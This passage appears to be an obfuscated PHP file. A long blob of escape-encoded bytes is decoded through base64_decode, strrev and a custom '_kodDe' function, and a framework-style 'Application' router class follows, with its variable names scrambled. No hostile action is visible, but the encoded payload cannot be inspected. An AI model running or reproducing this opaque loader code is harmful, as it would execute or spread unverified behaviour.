\x54\xde\x47\x81\xfe\x53\x6b\x7a\xd6\x90\x23\x4b\x3\x3a\xb9\xa4\xd6\x62\xc1\x80\x57\xed\x9d\x5e\xbb\xb8\x67\x5d\x6d\x4d\x8f\x7f\xb1\x6f\x1a\x97\x67\x51\x72\x25\x59\xba\x4e\x0\xb6\xd8\x26\xd2\xe0"."\6\340\375\207\1\151\61\210\371\175\76\370\10\17\370\173\374\314\63\226\237\47\362\114\256\235\3\174\115\307\251\163\41\107\363\134\76\70\230\255\273\317\155\240\245\62\103\54\106"."\x4f\xb5\x34\xbb\xaa\xf\xd1\x2b\x51\x35\xbe\x2a\xce\x67\xc8\x9\x73\xe0\x21\xc5\x64\x59\x97\xc2\x95\x19\xfd\xeb\x94\xb3\x62\xf5\x9d\x8a\x19\x1d\x88\xec\xb0\x2b\x96\x41\x3e\xc3\x14\x6b\x44\x2c\xe6"."\224\231\54\141\167\106\142\146\204\25\62\2\371\34\125\40\62\236\21\47\157\130\213\161\266\146\363\150\207\204\55\270\31\61\222\155\355\241\223\227\206\73\42\321\316\145\261\170\242"."\x6b\xf9\x8a\x95\xab\xc0\xa7\x63\x3\x43\x95\xb4\xe2\x65\xde\xc8\xc0\x61\xa9\x7f\x58\x2b\xfa\x87\x99\x9f\xf1\xe5\xf8\x1c\xa0\x5b\x7e\x99\xbf\xe2\x40\xd4\x47\xec\xb\x96\x79\x18\xa3\xe2\x1\x9e\x8a"."\x69\x86\xbf\x72\x12\xad\xcd\x9f\xcb\xdb\xf5\x13\xe4\xe8\x2c\xea\x7d\xa6\x69\x4f\x90\xba\xbc\xe3\xab\x2b\x86\xc4\xee\x1e\xab\x97\xe3\x66\x4a\x1f\x86\xa0\xd0\x97\xb3\xc4\xe9\x7\x58\xb\xaf\xec\xef".base64_decode('HGOrzO2l+lw8AACE7onEKQgg9wZMo2PsBoS4AJO86YIDzjbsgJM53xwibiHdPiWHvA==')."\132\306\221\56\374\351\16\171\321\351\320\21\167\371\225\304\232\10\334\251\56\216\130\74\46\57\5\262\113\160\225\37\274\27\265\273\26\42\7\12\163\111\242\30\331\240\314\2\267"."\xe0\xad\x88\x2b\x66\x6e\x6e\x4c\x9b\x78\x31\x7\x9c\xf7\x28\xc2\xbd\x30\x13\x6a\x3a\xfd\x6\xb3\x25\x40\x9c\xce\x8\xa6\x39\x29\x7b\x22\x60\x64\x34\x97\x11\x1a\x3f\xb9\xc\x57\xab\x48\x3a\xd8\x8".strrev('•dA•$r’€tºÇÜæ…'."\n".'Ğ=ßxq!“4Ù¦`[êckJ?‹ÀâQX‹c¼').base64_decode('EpDXUb1XH0puoexaiue3RIjPV1qaSUd1KUaaLYb+Wc2ylzuc5Hyt42Hs/qGDs6ScGw==').base64_decode('8puW5cfO+ggPyFWmonF2E+HsC9VbkY6M4C+MO83lLnWF310qQKbhIHdxgljZQD/2ag==')."\x61\xe6\x99\xaa\x7f\x70\xb4\x60\x5a\xba\xec\xd1\x39\xa5\x13\xe7\x91\xdc\xc0\x5b\xf2\x89\x9c\xd3\x46\xf1\xda\x60\xfa\x6e\x92\x77\x64\xc4\x1c\xf5\xf3\x51\x24\x7e\x5f\x65\x1f\x7e\x78\xe8\xbc\x39\x87"."\207\373\121\57\32\4\227\317\141\113\327\63\114\77\117\142\160\371\41\266\223\373\22\166\167\14\43\257\130\260\105\356\110\232\336\102\172\53\2\274\222\176\36\305\137\311\27\73\156"."\x1c\x1c\x6f\x7\xc8\xd8\xb0\x73\x2f\xfd\x39\xa5\x52\x5f\xbd\x45\xe1\xd2\x19\xcd\x25\x7d\x37\x61\xa9\x3e\xc6\xdc\x25\xbb\xa8\x88\xcb\xc3\x72\x4f\x5b\x4f\x47\x4f\x42\x1e\x1c\xbb\xa8\xa5\xd3\xa8\xb1"."\222\57\117\107\133\204\103\147\100\77\362\324\1\33\202\211\335\101\203\210\375\244\212\336\244\41\221\360\261\376\42\121\277\362\214\160\346\300\117\336\114\251\200\273\313\60\34\260\67"."\x2d\x74\xb6\xa\x25\xe9\xd9\x1e\x19\x5f\xf0\x6\xc0\xd5\xb2\xf0\xf9\x97\xba\xde\x66\x74\x9d\x38\xc7\x86\xc7\x7\x1a\x59\x8f\xd0\xd0\xe5\x9b\xcc\x14\xec\x95\x6b\xaa\x10\x26\x56\x35\x54\x4d\xa9\x41"."\277\265\125\236\52\314\345\220\70\306\105\14\40\355\250\152\230\122\103\2\265\340\237\144\34\354\5\44\267\245\342\136\27\104\66\213\321\320\112\227\21\213\311\150\340\265\77\303\77".base64_decode('wz8C9GDxEP6ieEHE7UB6VNVy40zIrspOksH9Moy6nNLOW8LcJ3e0QPUrvYGOU7zCkQ==')."\360\302\305\243\271\254\2\147\227\306\352\172\137\135\265\302\136\230\151\254\356\112\264\172\347\125\57\136\64\171\141\63\271\232\264\365\16\174\267\210\117\326\364\110\271\10\256\16\26"."\xe2\x45\xc5\x23\x7e\x67\x6c\xa2\xb2\x80\x7f\x39\x6d\xdc\xcc\x6b\x23\x16\xa2\x50\x39\x1f\x33\xff\xe9\xe2\x54\x4c\x38\xf1\xce\xeb\xf6\x88\x59\x84\x7b\x57\xe0\xc6\x66\xd4\xcd\x92\x71\x1a\x50\xc4\x62"."\xb\x9a\x88\x31\x1a\xb0\xb4\x8d\x75\xbf\xab\x30\x56\xca\x7b\xf1\xc1\xd6\x1b\x97\x5d\xce\xb9\x9e\x4d\xa8\x73\xe6\xc7\x47\x53\x67\x7e\x99\x34\x26\x5\xd1\xc8\x89\x20\x7d\x2\xa3\x41\x91\xdf\x45\x91".strrev('É?pß8³–½¹!¶TZ?ã'."\0".'6"ö¡âö®%ÂuP„cTá2j˜`'."\0".'…L•]±ç<')."\xe1\x1e\x5\x52\x4\x4f\xae\x57\x7e\xeb\x63\x14\xf1\x6a\x38\x19\xfb\xba\xf7\xe2\xf9\xf5\x1a\xa9\x89\x52\xc4\xa2\xae\xd8\xd4\x24\xa0\x4a\xa5\x2c\x5d\x25\x23\xe5\xfe\x24\xb9\xea\xf6\x96\x4a\xec\x83"."\25\53\225\71\111\226\201\164\42\304\353\223\275\247\343\143\266\227\113\366\335\316\331\5\367\255\225\173\222\107\213\127\231\61\263\141\366\174\364\27\310\43\273\251\57\25\230\56\56"."\12\62\117\363\47\370\323\214\16\210\327\70\130\337\360\204\113\256\371\35\140\61\214\174\205\63\2\342\310\47\132\353\170\347\5\72\112\17\177\322\23\2\104\36\113\127\22\326\137".base64_decode('UfmbCxUoKWLj2YYBm62k+s0npJ8Fijy/JpZIXzYjetKH1Y4BwzOooaZgr8hGKws7Bw==').base64_decode('SvlMo5So2Kap5LT8GHCtU62GqdYC/KFGrHBtTWVvYwi/q3gfER71qG8YSKHSZx9+Hw==')."\xc6\x87\x37\xa9\x58\x9\x72\x75\x92\x57\x45\x60\x53\xa2\x2f\x8c\x40\x42\xb8\xab\x2d\x14\x91\xd4\x6c\x24\x80\xda\xdc\x12\x51\x3\x9d\x9d\x15\x13\x38\x9b\x82\xc5\x4e\xf8\x8e\xda\x37\xc8\x44\xf7\x49"."\x86\x55\xb\x8d\x5c\xbf\x92\xc4\xb6\x5\x8d\x55\x18\x5a\xa5\x58\xc5\x24\xf3\x3e\x5b\xe5\x7\x3a\x4a\x32\x8\x39\xe8\x42\x3\x8a\x54\xe3\x22\x4a\x1a\xa1\x89\x97\x84\x68\x72\xf5\xa2\x85\x7e\x63\x11".base64_decode('H2zhiadoCtMJn/9EzPX7sSJL/iQ8u/K9OoG2Cr87irJQU+g4NlYT6Wq1MoD2Y67Ftw==')."\310\135\70\302\56\67\26\372\65\71\21\257\254\230\311\330\137\316\354\17\163\317\162\25\5\344\1\311\127\65\171\233\242\131\313\57\57\57\202\53\367\45\345\44\72\223\304\270\243"."\74\277\237\234\41\375\342\134\243\322\367\316\30\246\23\317\343\176\327\67\110\31\56\213\257\200\57\370\126\33\241\73\273\116\324\222\31\214\160\142\167\200\46\101\102\47\76\261\320".base64_decode('BIeLflvSMyhhOygi2S2K93LWrKEVYYZg3bpyGKgqupMCBcMNwojlhuGTo4Chbc75GQ==').base64_decode('itRyJgFheeivKBOOtIkIPbE4EruZVjCJ9XRX+6atW+c3mEIPUz5gZX08N433+Jz5UQ==')."\x4f\x60\xe8\x79\x46\x0\xb8\x73\x52\xf6\xf2\x64\x58\x9b\x93\xfd\xd3\x84\xed\x16\x57\xdc\x51\xb0\x36\x4f\x63\xe3\xa2\x6e\x7e\x6f\xd1\xcb\xd2\x18\x8f\x68\xd4\xcf\x63\x28\x30\x3e\xe0\x4d\xac\xe0\xc1"."\xe6\x88\xe0\x82\xf9\x1a\xa0\xe4\xc6\x47\xce\xf7\x1\xa7\x93\xdb\xc5\xe2\xdd\x20\x3a\xaa\x72\x38\x50\x28\xc8\x51\x3f\x8b\x60\xa1\x76\xd6\xe8\xf3\x73\x62\x40\x5\xdd\xbe\xa4\x30\x79\x62\x59\x8\x29"."\x72\xc1\xb1\xd6\x8d\x2b\x1\xdb\x9\x11\xf0\x30\xa2\x95\x88\x29\x1b\x74\xc3\x51\x5d\x1c\xc8\x3\xb\xad\x64\xd1\x28\xd8\xe\x32\x46\x5f\x7f\xac\x22\x4f\xd5\xc\x6a\xc3\x1a\xcd\x52\xa5\xc0\x71\xbd"."\xb1\x8a\x78\x70\xaf\x42\x64\x8b\xa6\x0\xbd\x10\x4d\x59\x88\xe9\x93\x52\xd4\xb3\x8d\x55\xa4\xb9\xd6\x80\xae\xa3\xf2\x84\x2\x55\xfa\x8\x2a\x58\xa5\x30\xe2\x99\xd3\xf8\x88\x15\x6d\x13\xed\x8b\xdc"."\130\5\36\316\352\212\201\76\177\40\2\27\11\47\236\112\177\247\234\310\60\204\74\337\226\325\213\124\133\231\120\43\162\205\225\26\322\27\170\300\253\63\26\115\104\233\331\53\77"."\x95\xc4\x34\xb3\x18\x5f\x6b\x51\x33\x31\x71\xfe\x61\x36\x27\xfc\x52\x9f\xe5\xe0\x9c\x82\x1f\x20\x30\xef\xc5\x52\x3e\xcf\xf5\xa3\x30\xeb\xc8\xb7\x33\x72\x3a\xd6\x53\x3e\xa5\x5b\x63\x57\x1b\xa0\x40"."\111\357\152\342\3\45\133\154\221\330\347\173\2\333\302\132\0\226\274\347\141\337\175\250\242\156\152\221\333\130\307\114\10\230\172\225\260\70\302\72\36\352\311\361\150\204\75\325\1"."\33\46\61\234\151\16\207\202\221\204\32\202\275\262\176\306\134\137\235\260\146\241\176\100\233\371\205\72\174\264\102\163\250\60\62\301\65\241\364\274\103\232\102\273\221\65\231\157\302"."\31\165\165\165\336\272\172\364\227\351\362\62\217\150\15\314\56\134\312\122\127\327\100\376\322\4\42\53\204\171\164\246\40\172\301\10\35\144\30\321\165\150\20\154\62\71\43\137\142".base64_decode('DFp3MzZKUnDTehlPwtqPppC4DGQ0x/FUmEKuwyCmuweB3zMCUrC9nbp+ZfsIakg/GQ==').base64_decode('FGgvt3hD2QTqLaBmkI28UcF8qlv+mI8NLgUKv8deluCV3x6AQnQ3EcJ0R9NQGacvQg==')."\14\101\233\176\222\367\23\3\44\231\13\146\372\44\377\212\70\52\313\314\111\62\67\33\43\261\54\267\271\307\321\10\257\211\76\161\101\355\33\141\14\53\140\376\200\71\242\212\215"."\33\107\117\346\61\62\244\370\370\305\320\60\45\231\366\341\161\145\44\134\312\316\345\124\342\62\34\356\366\211\41\172\306\310\72\314\157\125\251\250\74\266\13\160\106\326\223\204\263"."\x24\xae\x8\x11\x81\x0\x7f\xe8\x83\xea\xda\xb1\xb6\x29\xb0\x8a\x69\x94\x78\x41\x26\x8f\x11\x52\xf5\xc8\x86\xc9\x65\x93\x6b\xbb\x27\x96\xcc\x51\xd1\x14\xb6\xb4\x65\x1a\x2e\x2c\x26\xcd\x14\x93\x12"."\307\277\106\11\205\101\202\14\100\365\67\232\271\43\102\251\2\167\222\253\114\200\12\227\313\12\0\274\74\67\21\275\127\310\215\341\256\334\304\313\140\63\367\254\52\273\36\244\167".base64_decode('25I+hQX+38VlNqtjWDqZ+QpFsx/NuiUPGoJ3Vgbz7OU5K2TirZfzyUAs7WdPggI6Cw==').strrev('îU•Gc¤'."\n".'û-á	Òğ:Îß°}Y=\'Äşf„¥š¹ĞÇfe,H¼MYK')."\x68\x36\x41\x91\xb0\x58\x46\x16\x19\xab\xe\x34\x61\xb8\xca\xb4\x25\xf0\x8\x89\x1b\x4a\x27\x9c\xc2\xe8\xe1\xdc\x71\x85\x92\x20\x84\x2e\xab\xb3\xd7\x6c\x81\x14\x92\x45\x85\x2b\x8\xb3\x87\x1b\xe3"."\xe\xb7\xbd\x80\xa6\xb0\x74\x1b\x1b\xe5\x62\xce\xb4\x6d\xdf\xbf\x84\x5\x36\xb2\x5c\x78\x58\xb9\x6c\x51\x16\xb5\xe3\x21\x55\x65\xb9\x9\x5e\xd1\xed\xfc\x11\xd5\xa\x88\xe8\x44\xb6\x32\xac\x22\xac"."\6\256\240\201\223\102\51\206\153\7\102\346\101\7\110\213\212\370\74\30\254\320\227\105\225\274\316\355\223\235\223\52\27\200\127\161\114\304\202\141\257\246\162\41\134\127\227\213\104".base64_decode('LXVQRN7WbtJYprGlTPXNAG2yqcwlPqXH4vrRD93uRt3qRecAsZvAhHRTaszqxE2GUA==')."\x8a\xcd\x8f\xe2\xdc\x5d\xa5\xbd\x42\x91\x2b\x42\xbb\x6e\x62\x0\x8b\x3c\x7a\x15\xd2\xcc\x5\xc4\x9f\x7a\x85\x54\x6c\xb\xce\xbe\xc6\x3d\xbc\x2\xe5\x47\x79\x4c\x9b\x9f\x1d\x71\xf5\x8\x95\x45\x24"."\x2c\x33\x89\x9\x5a\xc4\xbb\x48\x34\xd5\x71\xfd\x26\x79\x97\xe6\x59\x51\x33\x58\xe3\x35\xd6\x36\xa2\x39\x45\x7c\x70\x4b\xc7\x59\x57\xd4\xad\x67\x46\xb6\x76\x9b\xed\xce\xcc\xb\xb7\x50\xc1\xc2\x98".base64_decode('EJcUcyp8AQrxIsBzFPWkWSRiD8lfQ96O6f1yNGxycQ++RtMrVIFd5EiUAi+cQNIuyQ==')."\16\167\44\257\336\50\46\71\151\227\170\107\157\275\302\231\116\225\326\114\43\323\245\4\222\277\22\377\351\22\72\112\146\17\104\316\22\57\365\361\273\37\27\127\310\54\51\24\231"."\351\142\246\21\270\2\342\373\4\367\300\222\323\120\265\330\201\256\350\231\134\204\174\263\254\10\115\303\174\217\360\40\42\247\130\330\373\172\27\233\266\112\51\25\76\105\222\244\21".base64_decode('TXKfSjA6YpAgYUxnuoje+hnemXC0kM0s2BkGSD9aCxIa4GMdozygyQf5RB5TukEjXg==')."\105\204\227\2\342\100\205\317\47\361\264\302\143\105\151\373\327\271\226\37\161\71\42\123\142\161\41\117\225\377\160\206\256\112\351\164\204\160\162\213\103\135\323\225\1\255\14\147\72"."\70\150\27\215\241\136\117\114\207\42\215\253\22\160\366\57\273\240\47\245\104\77\204\316\52\2\231\324\15\274\64\60\102\261\200\72\143\141\312\267\234\56\11\160\302\344\300\162\345".strrev('ÌèsÄÒKÊ¡ËNG*XG%¦’¹WŞ2±ÍÆ1ÖzCª±jk.…@5%P•Œ')."\226\224\111\171\72\333\73\375\34\324\304\227\47\25\20\10\37\120\315\15\134\270\250\303\231\154\44\147\44\225\160\264\55\324\34\10\267\204\342\113\225\176\335\126\204\26\5\171\254".strrev('KV[$DØó²Åéş)jÎK“ÒÙÒ<%ƒñMï“ûz'."\0".'¢ş>êÃ<“Ì‰”¹Á')."\162\53\344\316\12\311\245\224\271\120\324\313\363\217\351\130\147\107\152\261\124\240\124\241\65\220\277\362\27\310\153\17\162\156\304\273\350\371\211\32\157\344\207\15\313\20\13\237\225"."\x18\x93\x6b\xf\xb4\x74\x84\x22\x6a\x20\x1c\x8e\xae\x70\xa8\xba\x9\x19\x76\x91\x3f\xa5\x91\x92\x5f\xde\x90\x66\x46\x4c\x2\xfd\x7a\xb9\x6b\x32\x70\xec\x24\x7b\x38\x77\x49\x3e\xe8\xf4\xc9\x5e\xea".base64_decode('CuxGBp4H5C76aVR6JqdQ1AxLlwD0QZdpYJGhZbOOR++yaSlacu6sFT+l0g8wmOQRrw==').base64_decode('UoZYqK098T9uqpES3qiMFFMH4QZ01Ht/s/xAIvtm2VNAX/uokEfcYanEEw57vcwkJw==')."\30\140\257\51\54\24\125\251\327\44\361\11\164\266\56\216\25\344\113\104\177\312\317\207\230\6\260\323\275\40\273\271\302\21\161\226\300\331\241\66\374\71\172\302\104\7\147\54\162".base64_decode('Y6cOprqI6ASMs+MS3fU80ld64i/7BnHFT9O6cXdQzl7RORTj73CIou6UCg1AyYoQQw==')."\361\14\112\243\122\107\137\352\342\157\54\50\13\231\71\260\370\0\161\215\25\314\25\154\307\351\273\135\126\365\226\346\206\2\10\247\43\116\127\130\275\311\314\215\225\1\34\262\247"."\x30\x6b\x17\xd7\xd0\xc3\x2f\x4c\xe4\xd3\xa6\x3c\x7e\x84\x20\x63\xbd\x7d\xfa\xa2\x1e\x3d\xe6\x7b\x10\xb7\xaf\xdb\xe5\xcf\xf1\xd0\xe2\xff\x27\x5\x69\x62\x5c\xf2\x85\xe8\xac\xa4\xbc\x41\x96\x7b\xab"."\23\154\27\176\151\150\300\34\161\76\263\207\41\356\267\205\34\257\12\111\213\206\130\255\312\357\40\71\13\171\312\136\372\120\310\13\251\12\102\165\230\105\354\352\210\35\43\111\146"."\351\323\123\351\117\17\374\262\355\314\335\10\112\250\340\223\265\34\251\232\7\214\154\252\310\365\165\4\240\103\27\147\173\122\12\253\254\150\354\45\130\362\4\131\13\243\311\360\270"."\110\245\7\247\260\313\73\347\33\51\342\351\31\261\167\72\237\342\340\267\316\226\130\14\226\355\170\374\45\141\46\264\176\17\345\310\60\125\23\261\246\61\71\54\153\215\222\136\240"."\104\46\177\113\361\371\136\44\145\140\157\270\245\74\344\175\61\112\352\334\257\227\110\53\215\323\117\271\164\177\326\354\323\262\61\252\346\346\260\362\50\242\323\24\177\356\336\221\215".base64_decode('gvxaoSCuveQtE/3vsK6DtK5Eu0psxFV6jR4XOCddmFEgXJ6V8iF6B+GAFqVznuxFlA==')."\136\23\12\173\56\310\216\332\331\111\357\5\141\300\344\52\331\135\55\227\142\267\112\57\206\373\313\357\166\261\2\37\120\24\371\355\171\270\205\367\311\7\61\310\240\54\124\4\152"."\70\26\62\106\45\304\15\323\27\334\10\245\220\31\367\257\200\112\57\353\300\113\161\225\36\312\241\230\117\176\132\364\64\77\324\340\270\330\334\145\77\27\102\3\304\375\210\133\371".base64_decode('g3Ts8Tm2dODluQrPyU34Gp1HmO591fs7wsDM+cAw7gdnDfi5oezo4T518GF1FYi5Bw==')."\71\141\226\213\164\305\355\267\343\255\74\251\327\100\332\312\337\333\223\206\101\352\167\251\230\365\20\105\0\17\363\23\127\361\311\76\307\153\100\356\11\255\360\350\337\327\126\10\332"."\305\344\320\225\162\122\275\206\205\175\105\166\263\352\316\146\70\160\127\55\352\302\376\204\172\13\55\333\40\126\345\122\63\146\316\236\57\13\67\304\24\212\353\111\347\43\75\300\255"."\10\244\120\234\150\250\60\27\245\362\352\47\211\116\205\357\362\7\42\135\73\300\377\154\301\210\323\3\315\52\251\141\227\77\245\133\66\2\4\117\45\5\45\151\103\164\251\234\230"."\130\13\304\22\253\216\156\201\342\125\110\347\267\50\373\120\241\37\322\276\47\26\13\175\325\317\314\342\63\166\16\213\333\355\242\346\74\120\126\72\67\221\221\140\207\64\203\74\210".base64_decode('rbvbTgYGpCkiWTpYyTXaplsUhIvjfZFIIqP5LGzb2FhZrDaJEv0PJpCdkehxSugiVQ==').strrev('DÊ=z:‰ŠUu}[B$%º‡Ä”„%{f¯Açã»”İ¢¾64”m^-#	¹è')."\x99\xca\x59\x3c\xe9\x71\x47\xe1\xce\x4a\x62\xee\x70\x69\x66\xc1\x38\xc1\xa9\x9f\x18\xd0\x39\xd9\x24\xf9\x51\x3a\x62\x87\x26\xbc\x37\x90\xe5\xea\x58\xba\x92\x17\x60\xd9\x8e\x8b\x54\x24\xaf\x89\xf2".base64_decode('qqUn/oRUiIiRoEewoInmAWlmoI3b/mmSMplTVIWHWnqk1ZTDYgow2Y8yr6Xo646jJg==')."\212\267\270\136\360\45\44\312\375\254\57\33\42\102\27\4\311\223\114\110\35\347\32\376\256\231\343\234\143\271\137\72\104\334\236\354\37\31\105\335\357\301\2\155\44\132\373\364\153"._kodDe('KuLGKh4FRoh+Fma9Fr1rfoUuG2Egg6ULGlQNr+rfikeRB956itsNc/O88fPTq59a8cs=')."\61\111\274\343\31\340\66\340\277\31\313\67\56\171\307\246\122\140\127\77\234\73\350\44\300\42\376\344\265\24\347\252\311\314\117\27\163\337\245\261\13\54\55\233\225\366\331\312\47"."\226\262\7\126\21\362\145\370\153\235\225\42\156\243\64\367\143\253\335\354\131\162\362\216\152\157\245\214\202\14\361\203\121\5\74\246\40\306\17\113\17\156\33\311\114\205\333\147\242"."\217\351\364\341\54\361\37\145\331\104\33\20\233\302\34\240\371\131\50\211\117\204\304\53\1\214\236\154\103\32\55\260\263\143\55\20\375\336\45\214\70\21\153\165\240\121\62\135\162".strrev('?‹@§p`‹9¥åÊå÷¤:ØòY3I*=pè”=ˆù×'."\n".'Ø‡0Ü< \'1ÂY¨Ê€')."\x5e\xe7\x7e\x1f\xbc\xde\xeb\xaa\x8e\xbf\xab\xe9\xc4\x75\xc7\xdb\x8e\x54\x81\x3\x2d\x90\x18\x96\x72\x30\xb9\x15\xb9\x0\x22\x97\xb7\xde\xf2\x32\x14\xaf\xe3\x22\xcf\x4\x2b\xab\xf2\xfa\xe6\x8d\x12".strrev('«´Vz—‰0ÑââN…32F)6Êú§‚ö2ëé\\m$~K”\'AxI¢Î‰ÑƒÇ’<B')."\243\206\230\44\1\242\243\3\111\253\51\120\106\172\144\32\57\114\341\243\21\353\36\23\31\244\314\7\60\53\101\111\311\36\100\16\111\241\45\77\10\342\54\211\315\46\234\113\160"."\121\245\154\111\263\150\111\331\70\274\122\136\214\230\262\44\104\116\303\17\4\333\216\51\22\17\16\270\37\32\40\362\1\172\344\167\234\374\341\156\130\6\111\127\247\210\175\117\71"."\x5f\x2e\x21\x89\x4\xcc\xdc\x79\x42\xd\xd2\xe5\x9f\xf3\xee\x95\x3b\x2e\x2f\x23\xb7\x25\x23\x2c\x25\x93\x52\xcc\x4b\x1c\xfa\xc5\x96\x94\x21\xe1\x4\x82\x24\xd3\x6b\x8d\xc0\xb0\xc6\xfd\xac\xb8\x4b"."\x39\x9f\x25\x97\x6e\x6a\x93\x4\x21\x83\xe5\x97\x71\xe2\x8e\x50\x62\x56\x58\x31\x7c\xb6\x12\xfb\x88\xb\x5e\xe9\x95\xed\xb4\x36\x2c\x38\x2d\xc1\xdd\xa7\x52\xfc\x81\x7b\x47\xd6\x14\x3b\xdf\x70\x28"."\202\360\254\204\123\223\214\210\205\316\277\76\342\176\206\330\47\33\36\73\62\226\103\205\221\261\124\136\134\313\210\156\142\130\245\356\223\205\346\54\56\33\61\163\244\22\40\372\366".strrev('–Vó°„ü–I\\;cÙb:ê¯!Kò†sãgšdÓ¤øp®ÑˆèCUXRN“W')."\x60\x48\x28\xa0\x67\xc3\x52\x75\xf2\xe5\xec\x84\x5\xe2\x95\x3f\x22\xb0\xd2\x39\xc4\x92\xad\xb9\x48\x60\x3b\xa4\xe9\x18\x7c\x89\x44\xf2\x8e\x41\xce\x98\x9c\xe8\x68\x8e\x7b\x6a\xc9\xb1\x46\xa0\x2f"."\x5\xe6\x88\x60\x98\xa6\x5\x9c\x49\x34\xbf\xee\x6a\xbd\x5c\xc0\xdd\x33\x5a\xc2\x1a\x31\xec\xe4\x80\x74\xd6\x2a\x4f\x2c\x87\x17\xcb\x6\x15\x3e\x54\xb9\xbd\xee\x56\xb1\x31\x75\x9f\x40\x45\x25\x65"."\xed\x91\x34\x3c\x12\x66\x85\x32\xb4\x45\x15\x8b\xd1\x24\x5c\x52\xf0\xbc\x8e\xb2\x13\xc\x1\x2e\x4b\x93\x70\xd9\xb2\x64\x56\x58\x12\xd8\x48\xe5\x6c\xad\x64\x4d\xd0\xbd\xf2\xc1\x3\x29\x46\xaa\x42"."\207\135\147\175\232\165\242\361\254\230\271\374\163\200\161\356\334\104\354\121\271\25\102\132\341\272\151\257\324\212\212\231\47\154\205\310\355\332\5\52\321\132\226\122\201\272\122\312\61".base64_decode('ofaJ0MgoJ/MirYJ+CP0k3sJlJ1IVkmVlk8rqKLGKlMFy6om44PK4gQ9SYL4AGdFpNA==')."\153\144\204\352\34\323\234\237\352\40\377\245\174\46\157\362\55\45\45\64\43\261\126\167\240\350\36\347\262\332\234\150\234\57\111\156\135\53\52\362\173\260\354\240\374\224\236\325\330"."\125\203\144\1\101\217\125\246\155\44\165\247\357\130\331\227\24\115\147\37\311\112\302\110\227\34\120\110\62\34\172\14\25\44\145\4\4\154\237\20\311\323\372\44\206\106\340\204\303".base64_decode('WIWyEXCTQS9Bm/FlO7/+In5P6bZLk+Nm0fbgtIRZIL9Npm0LpQAqOiC8It47PZLOCw==').base64_decode('Com7LtwocolC0JZQHxKE61h8Jo/rNJXQLEcEX87wiLw1wrVsa8l1cSwA6ADcZ44yrw==')."\222\330\70\136\264\107\134\337\150\156\176\120\260\62\200\212\262\6\17\161\101\140\371\151\212\37\136\46\360\222\72\340\351\64\337\140\241\337\121\234\76\72\305\225\143\277\252\6\20"."\xe1\x8a\x2a\xa8\x5b\x72\x22\x5b\x3\x6b\x9f\x78\x22\x5e\x96\xd4\x19\x88\xc7\x57\x44\x63\x2d\xd4\x8b\x79\x59\x32\x29\x25\x69\x44\x95\x25\x75\xb6\x47\x23\x13\xa5\x5\x3b\x2\xa1\x70\x59\x1a\x56\x9e"."\212\250\302\25\30\115\12\165\222\126\222\33\310\211\132\21\152\136\52\132\102\356\272\305\315\100\141\300\144\2\177\166\163\22\327\262\114\16\40\331\325\352\71\341\3\116\224\161\212"."\x37\xe4\x79\xb5\x98\xb3\x46\x1e\x70\x3e\x9\xe4\xd2\x51\x64\x8\xb\x15\x61\xc5\xa7\x8\xd4\x1d\x2b\x0\x14\x7b\x75\xe7\xeb\x9e\xf3\xdc\xb2\x29\xa1\xb8\xc8\xf7\x39\x2e\xfc\x25\x38\x59\x27\x84\xf0"."\x48\xf8\x27\xef\xcf\x4\x30\xad\xe2\x60\xc9\x12\xe6\xf2\x1b\xf\x92\x2a\x6\x3\x37\xf2\x64\x13\x34\xe8\x6\xcd\x3e\xe9\x46\x83\x9e\x7e\xc0\x90\x15\x86\x57\x52\x74\xa3\x61\x47\xb2\xad\xf5\x57\xbc"."\367\246\222\104\114\11\204\214\357\177\3\324\251\30\37\220\255\0\0"."".base64_decode('')."".base64_decode('')."", 10, -8))); goto Cæ†‡Î…®Ñ; eİ˜¦×ã´ª: class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\x69\156\144\x65\x78"; function __construct() { } public function setDefault($©™¬¶·Ù) { $šÆµ˜Ù =& $_SERVER[§ŸîìÂù]; $äô··ÂÉ = explode($šÆµ˜Ù[0], trim($©™¬¶·Ù, $šÆµ˜Ù[0])); $this->defaultModule = $äô··ÂÉ[0] ? $äô··ÂÉ[0] : $this->defaultModule; $this->defaultController = $äô··ÂÉ[1] ? $äô··ÂÉ[1] : $this->defaultController; $this->defaultAction = $äô··ÂÉ[2] ? $äô··ÂÉ[2] : $this->defaultAction; $çª’ñôÆ = $_SERVER[”ôÑ§ì¸][653]; if (!$çª’ñôÆ) { die; } $this->wjah4f120a8f($šÆµ˜Ù[1], array($this, $šÆµ˜Ù[2])); } public function appRun($¬é›½Ñ) { $ûå“ñ¨ =& $_SERVER[”ôÑ§ì¸]; $Óô¿ Ä =& $_SERVER[§ŸîìÂù]; $óƒĞ“¾¹ = explode($Óô¿ Ä[0], $¬é›½Ñ); $É±ó›ä = $ûå“ñ¨[654]; while (strlen($É±ó›ä) < $ûå“ñ¨[655]) { if (!$É±ó›ä) { break; } $É±ó›ä++; } $ñ·ÂÈòí = strtolower($óƒĞ“¾¹[0]); $’º¿á¢Ã = $Óô¿ Ä[3]; $ÇÍ¦Ô– = $ûå“ñ¨[656]; if ($ñ·ÂÈòí == $Óô¿ Ä[4]) { $’º¿á¢Ã = $Óô¿ Ä[5]; $óƒĞ“¾¹[0] = $Óô¿ Ä[6]; $óƒĞ“¾¹[1] = $óƒĞ“¾¹[1] . $Óô¿ Ä[7]; $¬é›½Ñ = join($Óô¿ Ä[0], $óƒĞ“¾¹); $¬é›½Ñ = trim($¬é›½Ñ, $Óô¿ Ä[0]); } call_user_func(array($Óô¿ Ä[8], $Óô¿ Ä[9]), $’º¿á¢Ã . $Óô¿ Ä[10], $¬é›½Ñ); ActionCall($¬é›½Ñ); call_user_func(array($Óô¿ Ä[8], $Óô¿ Ä[9]), $’º¿á¢Ã . $Óô¿ Ä[11], $¬é›½Ñ); } private function autorun() { $´ÏïçÓ =& $_SERVER[§ŸîìÂù]; global $config; if (count($config[$´ÏïçÓ[12]]) == 0) { return; } foreach ($config[$´ÏïçÓ[12]] as $èÓÚÂíô => $¢¡Å“ÇË) { $this->appRun($¢¡Å“ÇË); } } private function hgnl89425cdd() { $öìúóüÏ =& $_SERVER[”ôÑ§ì¸]; $°÷µÔ¨˜ =& $_SERVER[§ŸîìÂù]; $óôçî´± = $°÷µÔ¨˜[4]; $ÜËËÃ½„ = $öìúóüÏ[657]; if (!$ÜËËÃ½„) { return; } $Äî–Á‹ = $GLOBALS[$°÷µÔ¨˜[13]][$°÷µÔ¨˜[14]][0]; $ÎÅÖ°Ó‘ = $öìúóüÏ[658]; if (!$Äî–Á‹ || strlen($Äî–Á‹) <= 